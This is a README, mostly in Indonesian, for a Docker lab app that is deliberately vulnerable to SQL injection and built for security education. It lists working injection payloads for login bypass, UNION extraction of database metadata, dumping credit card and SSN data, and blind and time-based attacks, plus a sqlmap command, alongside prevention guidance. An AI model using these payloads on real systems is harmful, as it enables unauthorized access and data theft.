# 🔓 Vulnerable PHP MySQL Container - SQL Injection Demo

[![Security Warning](https://img.shields.io/badge/Security-VULNERABLE-red)](https://github.com/OWASP/Top10)
[![Educational Purpose](https://img.shields.io/badge/Purpose-Educational-blue)](https://owasp.org/www-project-webgoat/)

> ⚠️ **PERINGATAN**: Aplikasi ini sengaja dibuat rentan untuk tujuan pembelajaran keamanan siber. **JANGAN** gunakan kode ini dalam environment production!

## 📋 Deskripsi

Proyek ini adalah container Docker yang berisi aplikasi PHP dengan vulnerability SQL Injection yang umum ditemukan. Dirancang untuk membantu memahami:

- Bagaimana serangan SQL Injection bekerja
- Berbagai jenis payload SQL Injection
- Cara mengidentifikasi vulnerability
- Metode pencegahan SQL Injection

## 🏗️ Arsitektur

```
├── docker-compose.yml    # Konfigurasi container
├── Dockerfile           # PHP Apache container
├── init.sql            # Database schema dan sample data
├── src/
│   ├── index.php       # Aplikasi vulnerable
│   └── config.php      # Konfigurasi database
└── README.md           # Dokumentasi ini
```

## 🚀 Cara Menjalankan

### Prerequisites
- Docker
- Docker Compose

### Installation

1. **Clone atau download project ini**
```bash
git clone <repository-url>
cd devsec
```

2. **Jalankan containers**
```bash
docker-compose up -d
```

3. **Tunggu hingga containers siap** (sekitar 30-60 detik)
```bash
docker-compose logs -f
```

4. **Akses aplikasi**
- Web Application: http://localhost:8080
- MySQL Database: localhost:3306

### Default Credentials
- **Database**: 
  - Host: localhost:3307 (note: port changed to avoid conflicts)
  - User: root
  - Password: password123
  - Database: vulnerable_app

### Application URLs
- **Main App**: http://localhost:8080
- **Search Page**: http://localhost:8080/search.php  
- **Test Lab**: http://localhost:8080/test.php (recommended for learning)

## 🎯 Target Pembelajaran

### 1. Authentication Bypass
Gunakan payload ini untuk bypass login:
```sql
Username: admin' OR 1=1 #
Password: (apa saja)
```

### 2. Union-Based SQL Injection
Ekstrak data dari database (tabel users memiliki 6 kolom):
```sql
Username: admin' UNION SELECT 1,2,3,4,5,6 #
Password: (apa saja)
```

### 3. Information Gathering
Dapatkan informasi database:
```sql
Username: admin' UNION SELECT 1,database(),user(),version(),5,6 #
Password: (apa saja)
```

### 4. Table Discovery
Temukan semua tabel:
```sql
Username: admin' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema=database() #
Password: (apa saja)
```

### 5. Data Exfiltration
Ekstrak data sensitif:
```sql
Username: admin' UNION SELECT id,secret_info,credit_card,ssn,1,2 FROM sensitive_data #
Password: (apa saja)
```

## 🔍 Jenis Vulnerability yang Ada

### 1. **SQL Injection di Login Form**
- **Lokasi**: `src/index.php` line ~45
- **Type**: Classic SQL Injection
- **Impact**: Authentication bypass, data extraction

### 2. **Information Disclosure**
- **Lokasi**: Error messages
- **Type**: Database error exposure
- **Impact**: Schema information leakage

### 3. **Insecure Direct Object References**
- **Lokasi**: Query results display
- **Type**: Excessive data exposure
- **Impact**: Unauthorized data access

## 🛡️ Cara Mencegah SQL Injection

### 1. **Prepared Statements (Recommended)**
```php
// SECURE VERSION
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
$result = $stmt->get_result();
```

### 2. **Input Validation**
```php
// Validate and sanitize input
$username = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_STRING);
$password = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
```

### 3. **Escape Special Characters**
```php
// Escape special characters (not recommended as primary defense)
$username = mysqli_real_escape_string($conn, $username);
$password = mysqli_real_escape_string($conn, $password);
```

### 4. **Stored Procedures**
```sql
-- Create stored procedure
DELIMITER //
CREATE PROCEDURE AuthenticateUser(IN p_username VARCHAR(50), IN p_password VARCHAR(255))
BEGIN
    SELECT * FROM users WHERE username = p_username AND password = p_password;
END //
DELIMITER ;
```

## 🧪 Testing Tools

### Manual Testing
- Browser Developer Tools
- Burp Suite Community
- OWASP ZAP

### Automated Testing
```bash
# SQLMap example
sqlmap -u "http://localhost:8080" --data="username=admin&password=admin" --dbs
```

### Payload Collections
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Databases)

## 📚 Referensi Pembelajaran

### OWASP Resources
- [OWASP Top 10 - Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)

### Security Learning Platforms
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox Academy](https://academy.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

## 🔧 Troubleshooting

### Container tidak bisa start
```bash
# Check logs
docker-compose logs

# Restart containers
docker-compose down
docker-compose up -d
```

### Database connection error
```bash
# Check MySQL container status
docker-compose exec db mysql -u root -p

# Reset database
docker-compose down -v
docker-compose up -d
```

### Port sudah digunakan
```bash
# Check port usage
lsof -i :8080
lsof -i :3306

# Modify ports in docker-compose.yml if needed
```

## ⚡ Advanced Challenges

### Challenge 1: Blind SQL Injection
Modifikasi kode untuk tidak menampilkan error, lalu coba:
```sql
admin' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a' --
```

### Challenge 2: Time-Based Blind SQLi
```sql
admin' AND (SELECT SLEEP(5)) --
```

### Challenge 3: Second-Order SQL Injection
Buat fitur update profile yang vulnerable.

## 🚨 Ethical Usage

**Gunakan knowledge ini hanya untuk:**
- ✅ Learning dan education
- ✅ Authorized penetration testing
- ✅ Bug bounty programs (dengan permission)
- ✅ Personal lab environment

**JANGAN gunakan untuk:**
- ❌ Unauthorized testing
- ❌ Illegal activities
- ❌ Attacking systems without permission

## 📞 Support

Jika menemukan issues atau butuh bantuan:
1. Check troubleshooting section
2. Review Docker logs
3. Verify system requirements

## 📄 License

Educational purpose only. Use at your own risk.

---

**Happy Learning! 🎓**

*Remember: The best defense is understanding the attack!*
